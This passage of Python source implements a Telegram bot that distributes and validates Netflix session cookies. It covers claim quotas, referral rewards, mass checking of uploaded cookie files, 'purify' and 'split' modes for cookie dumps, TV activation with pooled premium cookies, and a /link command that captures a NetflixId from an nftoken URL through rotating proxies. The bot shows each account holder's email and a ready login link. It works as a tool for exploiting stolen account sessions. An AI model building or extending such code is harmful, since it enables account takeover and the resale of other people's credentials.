            parse_mode='HTML'
        )

# ---------- HELP COMMAND ----------
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id)
    is_admin = user.get("is_admin", False)
    is_prem = is_premium(user)

    base_commands = [
        "📌 Core Commands",
        "/start – Show main menu & your status",
        "/get [plan] – Claim a working cookie (auto‑select if no plan)",
        "/nfcheck <NetflixId> – Verify a single cookie",
        "/link <url> – Extract nftoken from Netflix login link and check it",
        "/tv <code> [plan] – Activate TV (always uses premium pool)",
        "/premium – Check your premium status",
        "/redeem <KEY> – Redeem a premium key",
        "/referral – Get your referral link",
        "/claim – Claim pending referral rewards (one per use)",
        "/help – Show this help",
    ]

    free_info = [
        "\n📊 Free Limits",
        f"• Basic claims: {FREE_BASIC_LIMIT}/day",
        f"• Standard claims: {FREE_STANDARD_LIMIT}/day",
        f"• Premium claims: {FREE_PREMIUM_LIMIT}/day",
        f"• /nfcheck: {FREE_CHECK_LIMIT}/day",
        f"• Mass check: max {MAX_COOKIES_PER_MASS_CHECK} cookies per file",
        f"• Mass check daily limit: {MASS_CHECK_DAILY_COOKIE_LIMIT} cookies total",
        "\n🔹 You can claim Basic, Standard, or Premium plans.",
        "🔹 Use /referral to earn Premium cookies.",
    ]

    premium_info = [
        "\n⭐ Premium Benefits",
        "• Unlimited /nfcheck (quota from key)",
        "• Unlimited /get (quota from key)",
        "• Can claim Premium plan",
        "• Unlimited mass check (no daily cookie limit)",
    ]

    admin_info = [
        "\n🔧 Admin Commands",
        "/admin – Open admin panel",
        "/keys <check_q> <get_q> <hours> <max> – Generate premium key",
        "/check – Test proxies and update proxy.txt (admin only)",
        "/addproxy – Add proxies (one per line) – admin only",
        "/addprotxt – Upload .txt file with proxies – admin only",
        "/upload – Upload a .txt/.zip file to verify and add to pool (admin only)",
        "/ban <user_id> <reason> – Ban a user",
        "/unban <user_id> – Unban a user",
        "/listusers – Get list of all users (admin only)",
        "/broadcast <message> – Broadcast to all users",
        "/bdfb <yes/no> [minutes] – Auto-broadcast to pending feedback users",
        "/listfb – List users with pending feedback",
        "/clearfb <user_id> – Clear pending feedback for a user",
        "/autoban <yes/no> [minutes] – Auto-ban users who don't send feedback",
        "Send a .txt file in private chat to add cookies to the pool (auto‑classified).",
        "Admins have unlimited /get and /nfcheck.",
    ]

    msg = "\n".join(base_commands)
    if not is_prem and not is_admin:
        msg += "\n" + "\n".join(free_info)
    if is_prem:
        msg += "\n" + "\n".join(premium_info)
    if is_admin:
        msg += "\n" + "\n".join(admin_info)
    msg += f"\n\n{WATERMARK}"
    await update.effective_message.reply_text(premium_emoji(msg), parse_mode='HTML')

# ---------- START COMMAND ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    user_id = str(update.effective_user.id)
    users = load_users()
    user_is_new = user_id not in users
    users, user = ensure_user(user_id, update.effective_user.username)

    args = context.args
    pending_ref = None
    if args and args[0].startswith("ref_"):
        referrer_id = args[0].split("_")[1]
        if user_is_new and user.get("referred_by") is None and referrer_id != user_id and referrer_id in users:
            pending_ref = referrer_id
            context.user_data['pending_referral'] = referrer_id
            context.user_data['user_is_new'] = True
        else:
            if not user_is_new:
                await update.effective_message.reply_text(
                    premium_emoji("ℹ️ This referral link is only for new users. You already have an account."),
                    parse_mode='HTML'
                )
            elif user.get("referred_by") is not None:
                await update.effective_message.reply_text(
                    premium_emoji("ℹ️ You have already been referred by someone else."),
                    parse_mode='HTML'
                )
            elif referrer_id == user_id:
                await update.effective_message.reply_text(
                    premium_emoji("⚠️ You cannot refer yourself."),
                    parse_mode='HTML'
                )
            else:
                await update.effective_message.reply_text(
                    premium_emoji("⚠️ Invalid referral link or referrer not found."),
                    parse_mode='HTML'
                )
            context.user_data.pop('pending_referral', None)
            context.user_data.pop('user_is_new', None)

    if not await require_join(update, context):
        return

    if pending_ref:
        referrer_id = pending_ref
        if user.get("referred_by") is None and referrer_id != user_id and referrer_id in users:
            user["referred_by"] = referrer_id
            referrer = users[referrer_id]
            referrer["pending_premium"] = referrer.get("pending_premium", 0) + 1
            referrer["referral_count"] = referrer.get("referral_count", 0) + 1
            save_users(users)
            try:
                await context.bot.send_message(
                    chat_id=int(referrer_id),
                    text=premium_emoji("🎉 You got a new referral! +1 Premium cookie earned. Use /claim to get it."),
                    parse_mode='HTML'
                )
            except Exception:
                pass
            await update.effective_message.reply_text(
                premium_emoji("✅ Referral recorded! Your referrer earned a Premium cookie. They can claim it with /claim."),
                parse_mode='HTML'
            )
        else:
            if user.get("referred_by") is not None:
                await update.effective_message.reply_text(
                    premium_emoji("ℹ️ You have already been referred by someone else."),
                    parse_mode='HTML'
                )
            elif referrer_id == user_id:
                await update.effective_message.reply_text(
                    premium_emoji("⚠️ You cannot refer yourself."),
                    parse_mode='HTML'
                )
            else:
                await update.effective_message.reply_text(
                    premium_emoji("⚠️ Invalid referral link."),
                    parse_mode='HTML'
                )
        context.user_data.pop('pending_referral', None)

    is_prem = is_premium(user)
    is_admin = user.get("is_admin", False)
    basic_left = max(0, FREE_BASIC_LIMIT - user["claimed_basic_today"]) if not is_admin else "∞"
    standard_left = max(0, FREE_STANDARD_LIMIT - user["claimed_standard_today"]) if not is_admin else "∞"
    premium_left = max(0, FREE_PREMIUM_LIMIT - user["claimed_premium_today"]) if not is_admin else "∞"
    check_left = max(0, FREE_CHECK_LIMIT - user["checks_today"]) if not is_prem and not is_admin else "∞"
    mass_cookies_left = max(0, MASS_CHECK_DAILY_COOKIE_LIMIT - user["mass_checked_cookies_today"]) if not is_prem and not is_admin else "∞"
    check_quota_left = user.get("premium_check_quota", 0) if is_prem else 0
    get_quota_left = user.get("premium_get_quota", 0) if is_prem else 0
    pending = user.get("pending_premium", 0)

    status_lines = [
        "┌─ 📊 Your Status",
        f"├ Basic left: {basic_left}",
        f"├ Standard left: {standard_left}",
        f"├ Premium left: {premium_left}",
        f"├ Checks left: {check_left}",
        f"├ Mass check cookies left: {mass_cookies_left}",
        f"├ Premium: {'✅ Yes' if is_prem else '❌ No'}",
        f"├ Pending referrals: {pending}",
    ]
    if is_prem:
        status_lines.append(f"├ Check quota: {check_quota_left}")
        status_lines.append(f"├ Get quota: {get_quota_left}")
        expiry = datetime.fromtimestamp(user["premium_expiry"]).strftime("%Y-%m-%d %H:%M UTC")
        status_lines.append(f"├ Expires: {expiry}")
    status_lines.append(f"├ Referrals: {user['referral_count']}")
    if is_admin:
        status_lines.append("├ 🔑 Admin")
    status_lines.append("└─────────────────")

    multi_buttons = [
        [InlineKeyboardButton("🧊 Check", callback_data="mode_check"),
         InlineKeyboardButton("🧹 Purify", callback_data="mode_clean")],
        [InlineKeyboardButton("✂️ Split", callback_data="mode_split"),
         InlineKeyboardButton("📺 TV", callback_data="mode_tvlogin")],
    ]
    dist_buttons = [
        [InlineKeyboardButton("🍪 Claim", callback_data="dist_get"),
         InlineKeyboardButton("⭐ Premium", callback_data="dist_premium")],
        [InlineKeyboardButton("🔑 Redeem", callback_data="dist_redeem"),
         InlineKeyboardButton("🔗 Refer", callback_data="dist_referral")],
        [InlineKeyboardButton("✅ Verify", callback_data="dist_check"),
         InlineKeyboardButton("⚙️ Admin", callback_data="dist_admin") if is_admin else None],
        [InlineKeyboardButton("❓ Help", callback_data="dist_help")],
        [InlineKeyboardButton("🎁 Claim Referral", callback_data="dist_claim")],
    ]
    dist_buttons = [row for row in dist_buttons if any(b is not None for b in row)]
    for row in dist_buttons:
        row[:] = [b for b in row if b is not None]

    keyboard = multi_buttons + dist_buttons
    reply_markup = InlineKeyboardMarkup(keyboard)

    msg = (
        "🌟 NF BOT 🌟\n"
        "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n" +
        "\n".join(status_lines) +
        "\n\n😉Select a service below"
    )
    await update.effective_message.reply_text(premium_emoji(msg), reply_markup=reply_markup, parse_mode='HTML')

# ---------- /claim ----------
async def claim_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return
    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)

    pending = user.get("pending_premium", 0)
    if pending <= 0:
        await update.effective_message.reply_text(
            premium_emoji("❌ You have no pending referral rewards to claim.\nRefer friends using /referral to earn them."),
            parse_mode='HTML'
        )
        return

    success = grant_referral_reward(user_id, users)
    if success:
        save_users(users)
        users, user = ensure_user(user_id, update.effective_user.username)
        new_pending = user.get("pending_premium", 0)
        expiry = datetime.fromtimestamp(user["premium_expiry"]).strftime("%Y-%m-%d %H:%M UTC")
        msg = (
            f"✅ You claimed one referral reward!\n\n"
            f"🎁 Reward granted:\n"
            f"• +{REFERRAL_REWARD_HOURS} hours premium (expires: {expiry})\n"
            f"• +{REFERRAL_REWARD_CHECK_QUOTA} /nfcheck uses\n"
            f"• +{REFERRAL_REWARD_GET_QUOTA} /get uses\n"
            f"📦 Remaining pending referrals: {new_pending}\n\n"
            f"Use /claim again to claim another, or /premium to check your status."
        )
        await update.effective_message.reply_text(premium_emoji(msg), parse_mode='HTML')
    else:
        await update.effective_message.reply_text(
            premium_emoji("❌ Failed to claim reward. Please try again later."),
            parse_mode='HTML'
        )

# ---------- MODE BUTTONS ----------
async def mode_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not query.from_user:
        return
    user_id = str(query.from_user.id)
    chat_id = query.message.chat_id
    async with user_locks[user_id]:
        if user_state.get(user_id, {}).get('busy'):
            await query.answer("Already processing!")
            return
        modes = {
            "mode_check": ("check", "🧊 Account Check mode! Upload file."),
            "mode_clean": ("clean", "🧹 Purify Cookies mode! Upload messy file."),
            "mode_split": ("split", "✂️ Split mode – upload a ZIP file to split its contents."),
            "mode_tvlogin": ("tvlogin", None),
        }
        if query.data in modes:
            mode, msg = modes[query.data]
            user_state[user_id] = {'mode': mode, 'cookies': [], 'stop': False, 'busy': False}
            if mode == "tvlogin":
                await context.bot.send_message(chat_id,
                    premium_emoji("📺 TV Login – always uses Premium cookies.\n\nPlease send your 8-digit TV code using:\n`/tv YOUR_CODE`\n\nExample: `/tv 12345678`"),
                    parse_mode='HTML')
            elif mode == "split":
                await context.bot.send_message(chat_id,
                    premium_emoji("✂️ Split Mode\n\nUpload a ZIP file containing many .txt and/or .json files.\nI will count the files and ask how many you want per output ZIP.\n\nOnly ZIP uploads are accepted."),
                    parse_mode='HTML')
            else:
                await context.bot.send_message(chat_id, premium_emoji(f"{msg}\n\nUpload your .txt/.json/.zip file."), parse_mode='HTML')

# ---------- TV COMMAND ----------
async def tv_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return

    args = context.args
    if not args:
        await update.effective_message.reply_text(
            premium_emoji("Usage: /tv <8-digit code>\nTV login always uses Premium cookies."),
            parse_mode='HTML'
        )
        return
    tv_code = re.sub(r'\D', '', args[0])
    if len(tv_code) != 8:
        await update.effective_message.reply_text(premium_emoji("❌ TV code must be exactly 8 digits!"), parse_mode='HTML')
        return

    user_id = str(update.effective_user.id)
    users, user = ensure_user(user_id, update.effective_user.username)
    is_admin = user.get("is_admin", False)

    basic, standard, premium = await get_pool_cached()
    if not premium:
        await update.effective_message.reply_text(premium_emoji("❌ No premium cookies in the pool. Admin needs to add some."), parse_mode='HTML')
        return

    status_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=premium_emoji(f"🔍 Starting TV login\n📺 Code: {tv_code}\n📦 Plan: Premium\n⏳ Searching for working cookie..."),
        parse_mode='HTML'
    )

    task = asyncio.create_task(
        run_tv_login_task(update.effective_chat.id, user_id, tv_code, status_msg, context, is_admin, update.effective_user.username)
    )
    user_tasks[user_id] = task

async def run_tv_login_task(chat_id: int, user_id: str, tv_code: str, status_msg, context, is_admin: bool, username: str = None):
    loop = asyncio.get_running_loop()
    try:
        async def progress_callback(current, total, nid):
            try:
                await status_msg.edit_text(
                    premium_emoji(f"🔍 Starting TV login\n📺 Code: {tv_code}\n📦 Plan: Premium\n⏳ Trying cookie {current}/{total}..."),
                    parse_mode='HTML'
                )
            except Exception:
                pass

        def thread_worker():
            return process_tv_login_from_pool(tv_code, progress_callback, loop)

        result = await asyncio.to_thread(thread_worker)

        with tv_stats_lock:
            tv_stats["total_logins"] += 1
            if result["success"]:
                tv_stats["successful"] += 1
                if not is_admin:
                    set_pending_feedback(user_id, "tv", result.get('nid', 'Unknown'), "Premium", clean_text(result.get('email', '')), username)
                    resp = premium_emoji(
                        f"✅ TV ACTIVATED SUCCESSFULLY!\n\n"
                        f"📺 Code: {tv_code}\n🌍 Country: {result.get('country', 'N/A')}\n"
                        f"📦 Plan: Premium\n\n"
                        f"📸 **Please send a screenshot** of the TV screen showing the activation worked.\n"
                        f"You have **{FEEDBACK_TIMEOUT_MINUTES} minutes** to send it.\n"
                        f"Until then, you can only use `/nfcheck`."
                    )
                else:
                    resp = premium_emoji(f"✅ TV ACTIVATED SUCCESSFULLY!\n\n📺 Code: {tv_code}\n🌍 Country: {result.get('country', 'N/A')}\n📦 Plan: Premium\n\nYour TV is now ready! 🍿")
                await status_msg.edit_text(resp, parse_mode='HTML')
            elif result.get("error") == "all_cookies_failed":
                tv_stats["failed"] += 1
                tried = result.get('tried_countries', [])
                resp = premium_emoji(f"❌ All cookies failed!\n\nTried {len(tried)} cookies\nCountries: {', '.join(set(tried)) if tried else 'N/A'}\n\nNo more premium cookies left.")
                await status_msg.edit_text(resp, parse_mode='HTML')
            elif "Invalid" in str(result.get("error", "")) or "expired" in str(result.get("error", "")).lower():
                tv_stats["codes_rejected"] += 1
                resp = premium_emoji(f"❌ Invalid or Expired TV Code\n\n📺 Code: {tv_code}\n🌍 Cookie country: {result.get('country', 'N/A')}\n\nPlease get a fresh code from your TV.")
                await status_msg.edit_text(resp, parse_mode='HTML')
            else:
                tv_stats["codes_rejected"] += 1
                resp = premium_emoji(f"❌ Activation Failed\n\n📺 Code: {tv_code}\n⚠️ {result.get('error', 'Unknown error')}")
                await status_msg.edit_text(resp, parse_mode='HTML')

    except asyncio.CancelledError:
        await status_msg.edit_text(premium_emoji("⏹️ TV login cancelled."), parse_mode='HTML')
    except Exception as e:
        log.exception("TV login task error")
        await status_msg.edit_text(premium_emoji(f"❌ Internal error: {str(e)[:100]}"), parse_mode='HTML')
    finally:
        if user_id in user_tasks:
            del user_tasks[user_id]
        await cleanup_user(user_id)

# ---------- /link ----------
async def link_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if not await require_join(update, context):
        return
    if not await require_no_pending_feedback(update, context):
        return
    if not await require_not_banned(update, context):
        return
    if not context.args:
        await update.effective_message.reply_text(
            premium_emoji("Usage: /link <Netflix login URL>\nExample: /link https://netflix.com/?nftoken=Bgi8u+...\nI'll visit the URL, capture the session, and check the account."),
            parse_mode='HTML'
        )
        return
    url = ' '.join(context.args)
    status_msg = await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=premium_emoji("⏳ Visiting Netflix login URL..."),
        parse_mode='HTML'
    )
    try:
        # ---- SECURITY: Whitelist allowed domains ----
        from urllib.parse import urlparse
        parsed = urlparse(url)
        if parsed.hostname not in ("www.netflix.com", "netflix.com", "api.netflix.com"):
            await status_msg.edit_text(premium_emoji("❌ Only Netflix URLs are allowed."), parse_mode='HTML')
            return

        session = requests.Session()
        session.headers.update({'User-Agent': get_random_user_agent()})
        proxy_str = random.choice(list(proxy_manager.proxies)) if proxy_manager.proxies else None
        proxy_dict = parse_proxy_line(proxy_str) if proxy_str else None
        if proxy_dict:
            session.proxies.update(proxy_dict)

        # ---- OFFLOAD the blocking HTTP request ----
        resp = await asyncio.to_thread(session.get, url, timeout=REQUEST_TIMEOUT, verify=False, allow_redirects=True)
        cookies = {c.name: c.value for c in session.cookies}
        netflix_id = cookies.get('NetflixId')
        if not netflix_id:
            await status_msg.edit_text(premium_emoji("❌ No NetflixId cookie found after visiting the link. The link may be invalid or expired."), parse_mode='HTML')
            return

        # ---- OFFLOAD the synchronous verification ----
        valid, info = await asyncio.to_thread(generator.verify_cookie, netflix_id)
        if valid:
            name = info.get('email', 'Unknown')
            email = info.get('email', 'Unknown')
            plan = info.get('plan_nombre', 'Unknown')
            country = info.get('pais', 'Unknown')
            token = info.get('_token', 'N/A')
            if not token or token == 'N/A':
                if 'nftoken=' in url:
                    token = url.split('nftoken=')[1].split('&')[0]
                else:
                    token = "N/A"
            output = (
                f"✅ Working cookie!\n"
                f"👤 Name: {name}\n"
                f"📧 Email: {email}\n"
                f"💳 Plan: {plan}\n"
                f"🌍 Country: {country}\n"
                f"🍪 Cookie (NetflixId): <code>{netflix_id}</code>\n"
                f"🔑 Token: <code>{token}</code>\n"
                f"🔗 Login Link: https://netflix.com/?nftoken={token}"
            )
            await status_msg.edit_text(premium_emoji(output), parse_mode='HTML')
        else:
            await status_msg.edit_text(
                premium_emoji(f"❌ Invalid or expired cookie.\nReason: {info.get('reason', 'Could not retrieve account info.')}"),
                parse_mode='HTML'
            )
    except Exception as e:
        await status_msg.edit_text(premium_emoji(f"❌ Error visiting link: {str(e)}"), parse_mode='HTML')

# ---------- FILE UPLOAD & CHECK ----------
async def file_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user or update.effective_chat.type != "private":
        return
    user_id = str(update.effective_user.id)
    async with user_locks[user_id]:
        if user_id not in user_state:
            user_state[user_id] = {'mode': 'check', 'cookies': [], 'stop': False, 'busy': False}
        if user_state[user_id].get('busy'):
            await update.effective_message.reply_html(premium_emoji("⚠️ Already processing. Stop first."), reply_markup=STOP_MARKUP, parse_mode='HTML')
            return
        users, user = ensure_user(user_id, update.effective_user.username)
        mode = user_state[user_id].get('mode', 'check')

        if not update.effective_message.document:
            await update.effective_message.reply_text(premium_emoji("❌ Please upload a .txt, .json, or .zip file. For links, use /link."), parse_mode='HTML')
            return

        file = None
        max_retries = 3
        delay = 2
        for attempt in range(max_retries):
            try:
                file = await update.effective_message.document.get_file()
                break
            except Exception as e:
                if attempt == max_retries - 1:
                    await update.effective_message.reply_text(
                        premium_emoji("❌ Failed to download the file after multiple attempts. Please try again later."),
                        parse_mode='HTML'
                    )
                    raise
                await asyncio.sleep(delay)
                delay *= 2

        ext = update.effective_message.document.file_name.lower()
        with tempfile.TemporaryDirectory() as td:
            tp = os.path.join(td, update.effective_message.document.file_name)
            await file.download_to_drive(tp)
            with open(tp, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()

            if mode == "clean":
                if ext.endswith('.zip'):
                    cookies_from_zip = await asyncio.to_thread(extract_cookies_from_zip, tp)
                    tokens = [cookie.get('NetflixId', '') for _, cookie in cookies_from_zip if cookie.get('NetflixId')]
                    if not tokens:
                        await update.effective_message.reply_text(premium_emoji("❌ No valid Netflix cookies found in zip!"), parse_mode='HTML')
                        return
                    content = "\n".join(tokens)
                await clean_cookies_process(update.effective_chat.id, content, user_id, context, update.effective_message.document.file_name)
                return

            if mode == "split":
                if not ext.endswith('.zip'):
                    await update.effective_message.reply_text(premium_emoji("❌ Split mode only accepts ZIP files. Please upload a ZIP archive."), parse_mode='HTML')
                    return

                file_count = 0
                try:
                    with zipfile.ZipFile(tp, 'r') as z:
                        for info in z.infolist():
                            if info.is_dir():
                                continue
                            if info.filename.startswith('__MACOSX') or info.filename.startswith('.'):
                                continue
                            if info.filename.lower().endswith(('.txt', '.json')):
                                file_count += 1
                except Exception as e:
                    await update.effective_message.reply_text(premium_emoji(f"❌ Error reading ZIP: {str(e)}"), parse_mode='HTML')
                    return

                if file_count == 0:
                    await update.effective_message.reply_text(premium_emoji("❌ No .txt or .json files found in the ZIP."), parse_mode='HTML')
                    return

                timestamp = int(time.time())
                saved_path = os.path.join(SPLIT_TEMP_DIR, f"{user_id}_{timestamp}.zip")
                shutil.copy2(tp, saved_path)

                user_state[user_id]['split_zip_path'] = saved_path
                user_state[user_id]['split_file_count'] = file_count

                keyboard = [
                    [InlineKeyboardButton("300", callback_data="split_300"),
                     InlineKeyboardButton("400", callback_data="split_400")],
                    [InlineKeyboardButton("500", callback_data="split_500"),
                     InlineKeyboardButton("600", callback_data="split_600")],
                    [InlineKeyboardButton("Custom", callback_data="split_custom")],
                ]
                await update.effective_message.reply_text(
                    premium_emoji(f"📦 Split Mode\n\nUploaded ZIP contains {file_count} files (.txt and .json).\nHow many files per output ZIP? (choose a preset or click Custom)"),
                    reply_markup=InlineKeyboardMarkup(keyboard),
                    parse_mode='HTML'
                )
                return

            if mode != "check":
                await update.effective_message.reply_text(premium_emoji("❌ Invalid mode. Use /start and select Check."), parse_mode='HTML')
                return

            if ext.endswith('.zip'):
                cookies = await extract_cookies_from_zip(tp)
            else:
                raw_cookies = extract_netflix_cookies(content)
                cookies = []
                for cookie in raw_cookies:
                    cookies.append((f"cookie_{len(cookies)}", cookie))

            seen = set()
            dedup = []
            for nm, ck in cookies:
                h = hashlib.sha256(json.dumps(ck, sort_keys=True).encode()).hexdigest()
                if h not in seen:
                    seen.add(h)
                    dedup.append((nm, ck))
            if not dedup:
                await update.effective_message.reply_text(premium_emoji("❌ No valid Netflix cookies found in file!"), parse_mode='HTML')
                return

            is_admin = user.get("is_admin", False)
            if not is_admin and not is_premium(user):
                if len(dedup) > MAX_COOKIES_PER_MASS_CHECK:
                    dedup = dedup[:MAX_COOKIES_PER_MASS_CHECK]
                    await update.effective_message.reply_text(
                        premium_emoji(f"⚠️ File had more than {MAX_COOKIES_PER_MASS_CHECK} cookies. Only the first {MAX_COOKIES_PER_MASS_CHECK} will be checked."),
                        parse_mode='HTML'
                    )
            user_state[user_id]['cookies'] = dedup
            confirm_markup = InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Confirm", callback_data="confirm_check"),
                 InlineKeyboardButton("❌ Cancel", callback_data="cancel_check")]
            ])
            await update.effective_message.reply_text(
                premium_emoji(f"📥 Loaded {len(dedup)} unique cookies.\n\nStart checking?"),
                parse_mode='HTML',
                reply_markup=confirm_markup
            )

# ---------- SPLIT CALLBACK ----------
async def split_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if not query.from_user:
        return
    user_id = str(query.from_user.id)
    data = query.data

    if data == "split_custom":
        await query.edit_message_text(
            premium_emoji("✏️ Please enter the number of files you want per output ZIP (e.g., 250).\nSend a number only."),
            parse_mode='HTML'
        )
        context.user_data['expecting_split_size'] = True
        return

    try:
        chunk_size = int(data.split('_')[1])
    except:
        await query.edit_message_text(premium_emoji("❌ Invalid option."), parse_mode='HTML')
        return

    await perform_split(update, context, chunk_size, query)

async def perform_split(update: Update, context: ContextTypes.DEFAULT_TYPE, chunk_size: int, query=None):
    user_id = str(update.effective_user.id) if update.effective_user else str(query.from_user.id)
    split_zip_path = user_state.get(user_id, {}).get('split_zip_path')
    if not split_zip_path or not os.path.exists(split_zip_path):
        import glob
        pattern = os.path.join(SPLIT_TEMP_DIR, f"{user_id}_*.zip")
        files = glob.glob(pattern)
        if files:
            files.sort(key=os.path.getmtime, reverse=True)
            split_zip_path = files[0]
            user_state[user_id]['split_zip_path'] = split_zip_path
            log.info(f"Recovered split zip from fallback: {split_zip_path}")
        else:
            await (query.edit_message_text(premium_emoji("❌ No ZIP file found. Please start over."), parse_mode='HTML') if query else update.effective_message.reply_text(premium_emoji("❌ No ZIP file found. Please start over."), parse_mode='HTML'))
            return

    loop = asyncio.get_running_loop()
    try:
        result = await loop.run_in_executor(
            GLOBAL_EXECUTOR,
            _split_zip_worker,
            split_zip_path,
            chunk_size
        )
    except Exception as e:
        await (query.edit_message_text(premium_emoji(f"❌ Error during split: {str(e)}"), parse_mode='HTML') if query else update.effective_message.reply_text(premium_emoji(f"❌ Error during split: {str(e)}"), parse_mode='HTML'))
        return

    output_zips, total_files, num_chunks = result

    if query:
        await query.edit_message_text(premium_emoji(f"✂️ Splitting complete! Sending {len(output_zips)} ZIPs..."), parse_mode='HTML')
    else:
        await update.effective_message.reply_text(premium_emoji(f"✂️ Splitting complete! Sending {len(output_zips)} ZIPs..."), parse_mode='HTML')

    if len(output_zips) > 10:
        with tempfile.TemporaryDirectory() as tmpdir2:
            master_zip = os.path.join(tmpdir2, "split_all.zip")
            with zipfile.ZipFile(master_zip, 'w', zipfile.ZIP_DEFLATED) as mz:
                for zpath in output_zips:
                    mz.write(zpath, os.path.basename(zpath))
            with open(master_zip, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=InputFile(f, filename="split_all.zip"),
                    caption=premium_emoji(f"📦 All {num_chunks} split ZIPs bundled together.\n{WATERMARK}"),
                    parse_mode='HTML'
                )
    else:
        for zpath in output_zips:
            with open(zpath, 'rb') as f:
                await context.bot.send_document(
                    chat_id=update.effective_chat.id,
                    document=InputFile(f, filename=os.path.basename(zpath)),
                    caption=premium_emoji(f"{WATERMARK}"),
                    parse_mode='HTML'
                )

    try:
        os.remove(split_zip_path)
    except:
        pass
    for zpath in output_zips:
        try:
            os.remove(zpath)
        except:
            pass
    user_state[user_id]['split_zip_path'] = None
    context.user_data['expecting_split_size'] = False

def _split_zip_worker(split_zip_path, chunk_size):
    file_list = []
    try:
        with zipfile.ZipFile(split_zip_path, 'r') as z:
            for info in z.infolist():
                if info.is_dir():
                    continue
                if info.filename.startswith('__MACOSX') or info.filename.startswith('.'):
                    continue
                if info.filename.lower().endswith(('.txt', '.json')):
                    file_list.append(info.filename)
    except Exception as e:
        raise RuntimeError(f"Error reading ZIP: {str(e)}")

    total_files = len(file_list)
    if total_files == 0:
        raise RuntimeError("No .txt or .json files found in the ZIP.")
    if chunk_size > total_files:
        chunk_size = total_files

    chunks = [file_list[i:i+chunk_size] for i in range(0, total_files, chunk_size)]
    num_chunks = len(chunks)
    with tempfile.TemporaryDirectory() as persistent_dir:
        output_zips = []
        try:
            with zipfile.ZipFile(split_zip_path, 'r') as src:
                for idx, chunk in enumerate(chunks, 1):
                    zip_name = f"split_part_{idx}_{chunk_size}files.zip"
                    zip_path = os.path.join(persistent_dir, zip_name)
                    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                        for fname in chunk:
                            try:
                                data = src.read(fname)
                                zf.writestr(fname, data)
                            except Exception as e:
                                log.warning(f"Could not add {fname} to zip: {e}")
                    output_zips.append(zip_path)
            return output_zips, total_files, num_chunks
        except Exception as e:
            shutil.rmtree(persistent_dir, ignore_errors=True)
            raise

# ---------- HANDLE MESSAGES ----------
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.effective_user:
        return
    if update.effective_chat.type != "private":
        return

    user_id = str(update.effective_user.id)

    # --- Handle pending feedback photo ---
    if update.message and update.message.photo and has_pending_feedback(user_id):
        pending = get_pending_feedback(user_id)
        if pending:
            await process_feedback_photo(update, context, pending)
            return

    if context.user_data.get('expecting_split_size'):
        text = update.effective_message.text.strip()
        try:
            chunk_size = int(text)
            if chunk_size <= 0:
                raise ValueError
        except:
            await update.effective_message.reply_text(premium_emoji("❌ Please enter a valid positive number (e.g., 250)."), parse_mode='HTML')
            return
        context.user_data['expecting_split_size'] = False
        await perform_split(update, context, chunk_size)
        return

    # --- Handle admin add cookie ---
    if context.user_data.get('expecting_cookie'):
        text = update.effective_message.text.strip()
        nid = generator.extract_netflixid(text)
        if not nid:
            await update.message.reply_text(premium_emoji("❌ Invalid NetflixId or token."), parse_mode='HTML')
            context.user_data['expecting_cookie'] = False
            return

        used = load_used()
        basic, standard, premium = await get_pool_cached(force=True)
        if nid in used or nid in basic or nid in standard or nid in premium:
            await update.message.reply_text(premium_emoji("ℹ️ This NetflixId already exists in the pool or is used."), parse_mode='HTML')
            context.user_data['expecting_cookie'] = False
            return

        valid, info = generator.verify_cookie(nid)
        if not valid:
            await update.message.reply_text(premium_emoji("❌ Cookie is invalid or expired."), parse_mode='HTML')
            context.user_data['expecting_cookie'] = False
            return
        if info.get('hold') == 'Yes':
            await update.message.reply_text(premium_emoji("⏸️ Cookie is on hold – not added."), parse_mode='HTML')
            context.user_data['expecting_cookie'] = False
            return

        streams = info.get('streams', 0)
        try:
            streams = int(streams)
        except:
            streams = 0
        plan_type = 'basic' if streams == 1 else 'standard' if streams == 2 else 'premium'
        plan_file = BASIC_FILE if plan_type == 'basic' else STANDARD_FILE if plan_type == 'standard' else PREMIUM_FILE

        async with pool_file_lock:
            async with aiofiles.open(plan_file, 'a', encoding='utf-8') as f:
                await f.write(nid + '\n')
        used.add(nid)
        save_used(used)
        await get_pool_cached(force=True)

        await update.message.reply_text(
            premium_emoji(f"✅ Added NetflixId: <code>{nid}</code> to {plan_type.capitalize()} pool."),
            parse_mode='HTML'
        )
        context.user_data['expecting_cookie'] = False
        return

    # --- Admin upload ---
    users, user = ensure_user(user_id, update.effective_user.username)
    if not user.get("is_admin", False):
        return

    if update.effective_message.document:
        doc = update.effective_message.document
        if not doc.file_name or not doc.file_name.lower().endswith(('.txt', '.zip')):
            await update.effective_message.reply_text(premium_emoji("❌ Please upload a .txt or .zip file."), parse_mode='HTML')
            return

        await update.effective_message.reply_text(premium_emoji("📥 Processing admin upload – checking cookies..."), parse_mode='HTML')

        file = await context.bot.get_file(doc.file_id)
        temp_dir = tempfile.mkdtemp()
        try:
            file_path = os.path.join(temp_dir, doc.file_name)
            await file.download_to_drive(file_path)

            cookie_contents = []
            if doc.file_name.endswith('.txt'):
                async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = await f.read()
                blocks = split_txt_by_token(content)
